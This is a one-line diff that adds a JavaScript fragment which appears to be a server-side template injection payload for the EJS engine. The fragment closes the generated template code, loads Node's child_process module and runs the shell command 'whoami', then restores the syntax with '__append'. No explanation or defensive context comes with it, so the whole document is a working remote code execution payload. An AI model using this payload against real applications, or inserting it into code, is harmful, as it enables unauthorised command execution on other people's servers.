@@ -1,0 +1,1 @@
+var x;process.mainModule.require('child_process').execSync('whoami');s= __append;
